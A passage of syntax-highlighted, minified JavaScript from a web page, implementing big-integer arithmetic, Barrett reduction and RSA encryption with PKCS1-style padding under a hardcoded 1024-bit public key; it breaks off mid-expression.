class="line">                t &lt;&lt;= <span class="number">4</span>,</span><br><span class="line">                t |= <span class="title function_">v</span>(e.<span class="title function_">charCodeAt</span>(r));</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">C</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="keyword">new</span> p, n = e.<span class="property">length</span>, r = <span class="number">0</span>; n &gt; <span class="number">0</span>; n -= <span class="number">4</span>,</span><br><span class="line">            ++r)</span><br><span class="line">                t.<span class="property">digits</span>[r] = <span class="title function_">A</span>(e.<span class="title function_">substr</span>(<span class="title class_">Math</span>.<span class="title function_">max</span>(n - <span class="number">4</span>, <span class="number">0</span>), <span class="title class_">Math</span>.<span class="title function_">min</span>(n, <span class="number">4</span>)));</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = <span class="title function_">I</span>(e); n &gt; -<span class="number">1</span>; --n)</span><br><span class="line">                t += <span class="title function_">D</span>(e.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">D</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; e);</span><br><span class="line">            <span class="keyword">return</span> e &gt;&gt;&gt;= <span class="number">8</span>,</span><br><span class="line">            <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">255</span> &amp; e) + t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">P</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                n = <span class="title function_">O</span>(e, t),</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                n = <span class="keyword">new</span> p;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r, o = <span class="number">0</span>, i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                    r = e.<span class="property">digits</span>[i] + t.<span class="property">digits</span>[i] + o,</span><br><span class="line">                    n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                    o = <span class="title class_">Number</span>(r &gt;= l);</span><br><span class="line">                n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">O</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                n = <span class="title function_">P</span>(e, t),</span><br><span class="line">                t.<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> r, o;</span><br><span class="line">                n = <span class="keyword">new</span> p,</span><br><span class="line">                o = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                    r = e.<span class="property">digits</span>[i] - t.<span class="property">digits</span>[i] + o,</span><br><span class="line">                    n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                    n.<span class="property">digits</span>[i] &lt; <span class="number">0</span> &amp;&amp; (n.<span class="property">digits</span>[i] += l),</span><br><span class="line">                    o = <span class="number">0</span> - <span class="title class_">Number</span>(r &lt; <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (-<span class="number">1</span> == o) &#123;</span><br><span class="line">                    o = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; e.<span class="property">digits</span>.<span class="property">length</span>; ++i)</span><br><span class="line">                        r = <span class="number">0</span> - n.<span class="property">digits</span>[i] + o,</span><br><span class="line">                        n.<span class="property">digits</span>[i] = <span class="number">65535</span> &amp; r,</span><br><span class="line">                        n.<span class="property">digits</span>[i] &lt; <span class="number">0</span> &amp;&amp; (n.<span class="property">digits</span>[i] += l),</span><br><span class="line">                        o = <span class="number">0</span> - <span class="title class_">Number</span>(r &lt; <span class="number">0</span>);</span><br><span class="line">                    n.<span class="property">isNeg</span> = !e.<span class="property">isNeg</span></span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">I</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> t = e.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; t &gt; <span class="number">0</span> &amp;&amp; <span class="number">0</span> == e.<span class="property">digits</span>[t]; )</span><br><span class="line">                --t;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">L</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t, n = <span class="title function_">I</span>(e), r = e.<span class="property">digits</span>[n], o = (n + <span class="number">1</span>) * u;</span><br><span class="line">            <span class="keyword">for</span> (t = o; t &gt; o - u &amp;&amp; <span class="number">0</span> == (<span class="number">32768</span> &amp; r); --t)</span><br><span class="line">                r &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">R</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n, r, o, i = <span class="keyword">new</span> p, u = <span class="title function_">I</span>(e), l = <span class="title function_">I</span>(t), c = <span class="number">0</span>; c &lt;= l; ++c) &#123;</span><br><span class="line">                n = <span class="number">0</span>,</span><br><span class="line">                o = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> s = <span class="number">0</span>; s &lt;= u; ++s,</span><br><span class="line">                ++o)</span><br><span class="line">                    r = i.<span class="property">digits</span>[o] + e.<span class="property">digits</span>[s] * t.<span class="property">digits</span>[c] + n,</span><br><span class="line">                    i.<span class="property">digits</span>[o] = r &amp; d,</span><br><span class="line">                    n = r &gt;&gt;&gt; a;</span><br><span class="line">                i.<span class="property">digits</span>[c + u + <span class="number">1</span>] = n</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> i.<span class="property">isNeg</span> = e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>,</span><br><span class="line">            i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">N</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n, r, o, i;</span><br><span class="line">            i = <span class="keyword">new</span> p,</span><br><span class="line">            n = <span class="title function_">I</span>(e),</span><br><span class="line">            r = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> u = <span class="number">0</span>; u &lt;= n; ++u)</span><br><span class="line">                o = i.<span class="property">digits</span>[u] + e.<span class="property">digits</span>[u] * t + r,</span><br><span class="line">                i.<span class="property">digits</span>[u] = o &amp; d,</span><br><span class="line">                r = o &gt;&gt;&gt; a;</span><br><span class="line">            <span class="keyword">return</span> i.<span class="property">digits</span>[<span class="number">1</span> + n] = r,</span><br><span class="line">            i</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">w</span>(<span class="params">e, t, n, r, o</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">min</span>(t + o, e.<span class="property">length</span>), a = t, u = r; a &lt; i; ++a,</span><br><span class="line">            ++u)</span><br><span class="line">                n[u] = e[a]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> k = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">57344</span>,<span class="number">61440</span>,<span class="number">63488</span>,<span class="number">64512</span>,<span class="number">65024</span>,<span class="number">65280</span>,<span class="number">65408</span>,<span class="number">65472</span>,<span class="number">65504</span>,<span class="number">65520</span>,<span class="number">65528</span>,<span class="number">65532</span>,<span class="number">65534</span>,<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">M</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Math</span>.<span class="title function_">floor</span>(t / u)</span><br><span class="line">              , r = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, r.<span class="property">digits</span>, n, r.<span class="property">digits</span>.<span class="property">length</span> - n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = t % u, i = u - o, a = r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>, l = a - <span class="number">1</span>; a &gt; <span class="number">0</span>; --a,</span><br><span class="line">            --l)</span><br><span class="line">                r.<span class="property">digits</span>[a] = r.<span class="property">digits</span>[a] &lt;&lt; o &amp; d | (r.<span class="property">digits</span>[l] &amp; k[o]) &gt;&gt;&gt; i;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="property">digits</span>[<span class="number">0</span>] = r.<span class="property">digits</span>[a] &lt;&lt; o &amp; d,</span><br><span class="line">            r.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> Y = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">63</span>,<span class="number">127</span>,<span class="number">255</span>,<span class="number">511</span>,<span class="number">1023</span>,<span class="number">2047</span>,<span class="number">4095</span>,<span class="number">8191</span>,<span class="number">16383</span>,<span class="number">32767</span>,<span class="number">65535</span>);</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">F</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title class_">Math</span>.<span class="title function_">floor</span>(t / u)</span><br><span class="line">              , r = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="title function_">w</span>(e.<span class="property">digits</span>, n, r.<span class="property">digits</span>, <span class="number">0</span>, e.<span class="property">digits</span>.<span class="property">length</span> - n);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = t % u, i = u - o, a = <span class="number">0</span>, l = a + <span class="number">1</span>; a &lt; r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; ++a,</span><br><span class="line">            ++l)</span><br><span class="line">                r.<span class="property">digits</span>[a] = r.<span class="property">digits</span>[a] &gt;&gt;&gt; o | (r.<span class="property">digits</span>[l] &amp; Y[o]) &lt;&lt; i;</span><br><span class="line">            <span class="keyword">return</span> r.<span class="property">digits</span>[r.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>] &gt;&gt;&gt;= o,</span><br><span class="line">            r.<span class="property">isNeg</span> = e.<span class="property">isNeg</span>,</span><br><span class="line">            r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">H</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>, t, n.<span class="property">digits</span>.<span class="property">length</span> - t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">U</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, t, n.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>.<span class="property">length</span> - t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">B</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">w</span>(e.<span class="property">digits</span>, <span class="number">0</span>, n.<span class="property">digits</span>, <span class="number">0</span>, t),</span><br><span class="line">            n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">G</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e.<span class="property">isNeg</span> != t.<span class="property">isNeg</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">isNeg</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> n = e.<span class="property">digits</span>.<span class="property">length</span> - <span class="number">1</span>; n &gt;= <span class="number">0</span>; --n)</span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">digits</span>[n] != t.<span class="property">digits</span>[n])</span><br><span class="line">                    <span class="keyword">return</span> e.<span class="property">isNeg</span> ? <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">digits</span>[n] &gt; t.<span class="property">digits</span>[n]) : <span class="number">1</span> - <span class="number">2</span> * <span class="title class_">Number</span>(e.<span class="property">digits</span>[n] &lt; t.<span class="property">digits</span>[n]);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">x</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n, r, i = <span class="title function_">L</span>(e), a = <span class="title function_">L</span>(t), f = t.<span class="property">isNeg</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; a)</span><br><span class="line">                <span class="keyword">return</span> e.<span class="property">isNeg</span> ? ((n = <span class="title function_">m</span>(o)).<span class="property">isNeg</span> = !t.<span class="property">isNeg</span>,</span><br><span class="line">                e.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">                t.<span class="property">isNeg</span> = !<span class="number">1</span>,</span><br><span class="line">                r = <span class="title function_">O</span>(t, e),</span><br><span class="line">                e.<span class="property">isNeg</span> = !<span class="number">0</span>,</span><br><span class="line">                t.<span class="property">isNeg</span> = f) : (n = <span class="keyword">new</span> p,</span><br><span class="line">                r = <span class="title function_">m</span>(e)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Array</span>(n,r);</span><br><span class="line">            n = <span class="keyword">new</span> p,</span><br><span class="line">            r = e;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> g = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(a / u) - <span class="number">1</span>, h = <span class="number">0</span>; t.<span class="property">digits</span>[g] &lt; c; )</span><br><span class="line">                t = <span class="title function_">M</span>(t, <span class="number">1</span>),</span><br><span class="line">                ++h,</span><br><span class="line">                ++a,</span><br><span class="line">                g = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(a / u) - <span class="number">1</span>;</span><br><span class="line">            r = <span class="title function_">M</span>(r, h),</span><br><span class="line">            i += h;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _ = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(i / u) - <span class="number">1</span>, T = <span class="title function_">H</span>(t, _ - g); -<span class="number">1</span> != <span class="title function_">G</span>(r, T); )</span><br><span class="line">                ++n.<span class="property">digits</span>[_ - g],</span><br><span class="line">                r = <span class="title function_">O</span>(r, T);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> E = _; E &gt; g; --E) &#123;</span><br><span class="line">                <span class="keyword">var</span> y = E &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E]</span><br><span class="line">                  , S = E - <span class="number">1</span> &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E - <span class="number">1</span>]</span><br><span class="line">                  , v = E - <span class="number">2</span> &gt;= r.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : r.<span class="property">digits</span>[E - <span class="number">2</span>]</span><br><span class="line">                  , A = g &gt;= t.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : t.<span class="property">digits</span>[g]</span><br><span class="line">                  , C = g - <span class="number">1</span> &gt;= t.<span class="property">digits</span>.<span class="property">length</span> ? <span class="number">0</span> : t.<span class="property">digits</span>[g - <span class="number">1</span>];</span><br><span class="line">                n.<span class="property">digits</span>[E - g - <span class="number">1</span>] = y == A ? d : <span class="title class_">Math</span>.<span class="title function_">floor</span>((y * l + S) / A);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> b = n.<span class="property">digits</span>[E - g - <span class="number">1</span>] * (A * l + C), D = y * s + (S * l + v); b &gt; D; )</span><br><span class="line">                    --n.<span class="property">digits</span>[E - g - <span class="number">1</span>],</span><br><span class="line">                    b = n.<span class="property">digits</span>[E - g - <span class="number">1</span>] * (A * l | C),</span><br><span class="line">                    D = y * l * l + (S * l + v);</span><br><span class="line">                (r = <span class="title function_">O</span>(r, <span class="title function_">N</span>(T = <span class="title function_">H</span>(t, E - g - <span class="number">1</span>), n.<span class="property">digits</span>[E - g - <span class="number">1</span>]))).<span class="property">isNeg</span> &amp;&amp; (r = <span class="title function_">P</span>(r, T),</span><br><span class="line">                --n.<span class="property">digits</span>[E - g - <span class="number">1</span>])</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> r = <span class="title function_">F</span>(r, h),</span><br><span class="line">            n.<span class="property">isNeg</span> = e.<span class="property">isNeg</span> != f,</span><br><span class="line">            e.<span class="property">isNeg</span> &amp;&amp; (n = f ? <span class="title function_">P</span>(n, o) : <span class="title function_">O</span>(n, o),</span><br><span class="line">            r = <span class="title function_">O</span>(t = <span class="title function_">F</span>(t, h), r)),</span><br><span class="line">            <span class="number">0</span> == r.<span class="property">digits</span>[<span class="number">0</span>] &amp;&amp; <span class="number">0</span> == <span class="title function_">I</span>(r) &amp;&amp; (r.<span class="property">isNeg</span> = !<span class="number">1</span>),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Array</span>(n,r)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">Z</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">modulus</span> = <span class="title function_">m</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">k</span> = <span class="title function_">I</span>(<span class="variable language_">this</span>.<span class="property">modulus</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">var</span> t, n, r = <span class="keyword">new</span> p;</span><br><span class="line">            r.<span class="property">digits</span>[<span class="number">2</span> * <span class="variable language_">this</span>.<span class="property">k</span>] = <span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">mu</span> = (t = r,</span><br><span class="line">            n = <span class="variable language_">this</span>.<span class="property">modulus</span>,</span><br><span class="line">            <span class="title function_">x</span>(t, n)[<span class="number">0</span>]),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bkplus1</span> = <span class="keyword">new</span> p,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">bkplus1</span>.<span class="property">digits</span>[<span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>] = <span class="number">1</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">modulo</span> = J,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">multiplyMod</span> = X,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">powMod</span> = j</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">J</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = <span class="title function_">U</span>(e, <span class="variable language_">this</span>.<span class="property">k</span> - <span class="number">1</span>)</span><br><span class="line">              , n = <span class="title function_">U</span>(<span class="title function_">R</span>(t, <span class="variable language_">this</span>.<span class="property">mu</span>), <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>)</span><br><span class="line">              , r = <span class="title function_">O</span>(<span class="title function_">B</span>(e, <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>), <span class="title function_">B</span>(<span class="title function_">R</span>(n, <span class="variable language_">this</span>.<span class="property">modulus</span>), <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>));</span><br><span class="line">            r.<span class="property">isNeg</span> &amp;&amp; (r = <span class="title function_">P</span>(r, <span class="variable language_">this</span>.<span class="property">bkplus1</span>));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="title function_">G</span>(r, <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>; o; )</span><br><span class="line">                o = <span class="title function_">G</span>(r = <span class="title function_">O</span>(r, <span class="variable language_">this</span>.<span class="property">modulus</span>), <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">X</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="title function_">R</span>(e, t);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">modulo</span>(n)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">j</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> n = <span class="keyword">new</span> p;</span><br><span class="line">            n.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = e, o = t; <span class="number">0</span> != (<span class="number">1</span> &amp; o.<span class="property">digits</span>[<span class="number">0</span>]) &amp;&amp; (n = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(n, r)),</span><br><span class="line">            <span class="number">0</span> != (o = <span class="title function_">F</span>(o, <span class="number">1</span>)).<span class="property">digits</span>[<span class="number">0</span>] || <span class="number">0</span> != <span class="title function_">I</span>(o); )</span><br><span class="line">                r = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(r, r);</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> K = &#123;&#125;;</span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">W</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">e</span> = <span class="title function_">C</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">d</span> = <span class="title function_">C</span>(t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">m</span> = <span class="title function_">C</span>(n),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">chunkSize</span> = <span class="string">&quot;number&quot;</span> != <span class="keyword">typeof</span> r ? <span class="number">2</span> * <span class="title function_">I</span>(<span class="variable language_">this</span>.<span class="property">m</span>) : r / <span class="number">8</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">radix</span> = <span class="number">16</span>,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">barrett</span> = <span class="keyword">new</span> <span class="title function_">Z</span>(<span class="variable language_">this</span>.<span class="property">m</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        K.<span class="property">NoPadding</span> = <span class="string">&quot;NoPadding&quot;</span>,</span><br><span class="line">        K.<span class="property">PKCS1Padding</span> = <span class="string">&quot;PKCS1Padding&quot;</span>,</span><br><span class="line">        K.<span class="property">RawEncoding</span> = <span class="string">&quot;RawEncoding&quot;</span>,</span><br><span class="line">        K.<span class="property">NumericEncoding</span> = <span class="string">&quot;NumericEncoding&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> Q = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">var</span> V = &#123;</span><br><span class="line">            <span class="attr">encryptedString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> Q || (<span class="title function_">f</span>(<span class="number">262</span>),</span><br><span class="line">                Q = <span class="keyword">new</span> <span class="title function_">W</span>(<span class="string">&quot;10001&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;BA58236D7F337C2B728A05F31028833AF83220330B129DC2407109776B644492BD7BBD8B15498C9C510B915FC4C559FE986F61867337785DB32C284C4E07FF256965DE53490CBBA28F14D413D407986ED3DF0E03032031EDD97054C3E6F4F8B322238EB5B0249556F99D9182B281F04B18CE9155332AF71C8A1A2E49087A571B&quot;</span>,<span class="number">1024</span>)),</span><br><span class="line">                <span class="variable language_">window</span>.<span class="title function_">btoa</span>(<span class="keyword">function</span>(<span class="params">e, t, n, r</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> o, i, a, u, l, c, s, d, f, m = <span class="keyword">new</span> <span class="title class_">Array</span>, g = t.<span class="property">length</span>, h = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="keyword">for</span> (u = <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> n ? n == K.<span class="property">NoPadding</span> ? <span class="number">1</span> : n == K.<span class="property">PKCS1Padding</span> ? <span class="number">2</span> : <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">                    l = <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r &amp;&amp; r == K.<span class="property">RawEncoding</span> ? <span class="number">1</span> : <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span> == u ? g &gt; e.<span class="property">chunkSize</span> &amp;&amp; (g = e.<span class="property">chunkSize</span>) : <span class="number">2</span> == u &amp;&amp; g &gt; e.<span class="property">chunkSize</span> - <span class="number">11</span> &amp;&amp; (g = e.<span class="property">chunkSize</span> - <span class="number">11</span>),</span><br><span class="line">                    o = <span class="number">0</span>,</span><br><span class="line">                    i = <span class="number">2</span> == u ? g - <span class="number">1</span> : e.<span class="property">chunkSize</span> - <span class="number">1</span>; o &lt; g; )</span><br><span class="line">                        u ? m[i] = t.<span class="title function_">charCodeAt</span>(o) : m[o] = t.<span class="title function_">charCodeAt</span>(o),</span><br><span class="line">                        o++,</span><br><span class="line">                        i--;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="number">1</span> == u &amp;&amp; (o = <span class="number">0</span>),</span><br><span class="line">                    i = e.<span class="property">chunkSize</span> - g % e.<span class="property">chunkSize</span>; i &gt; <span class="number">0</span>; ) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="number">2</span> == u) &#123;</span><br><span class="line">                            <span class="keyword">for</span> (c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">256</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>()); !c; )</span><br><span class="line">                                c = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">256</span> * <span class="title class_">Math</span>.<span class="title function_">random</span>());</span><br><span class="line">                            m[o] = c</span><br><span class="line">                        &#125; <span class="keyword">else</span></span><br><span class="line">                            m[o] = <span class="number">0</span>;</span><br><span class="line">                        o++,</span><br><span class="line">                        i--</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="number">2</span> == u &amp;&amp; (m[g] = <span class="number">0</span>,</span><br><span class="line">                    m[e.<span class="property">chunkSize</span> - <span class="number">2</span>] = <span class="number">2</span>,</span><br><span class="line">                    m[e.<span class="property">chunkSize</span> - <span class="number">1</span>] = <span class="number">0</span>),</span><br><span class="line">                    s = m.<span class="property">length</span>,</span><br><span class="line">                    o = <span class="number">0</span>; o &lt; s; o += e.<span class="property">chunkSize</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (d = <span class="keyword">new</span> p,</span><br><span class="line">                        i = <span class="number">0</span>,</span><br><span class="line">                        a = o; a &lt; o + e.<span class="property">chunkSize</span>; ++i)</span><br><span class="line">                            d.<span class="property">digits</span>[i] = m[a++],</span><br><span class="line">                            d.<span class="property">digits</span>[i] += m[a++] &lt;&lt; <span class="number">8</span>;</span><br><span class="line">                        f = e.<span class="property">barrett</span>.<span class="title function_">powMod</span>(d, e.<span class="property">e</span>),</span><br><span class="line">                        h += <span class="number">1</span> == l ? <span class="title function_">b</span>(f) : <span class="number">16</span> == e.<span class="property">radix</span> ? <span class="title 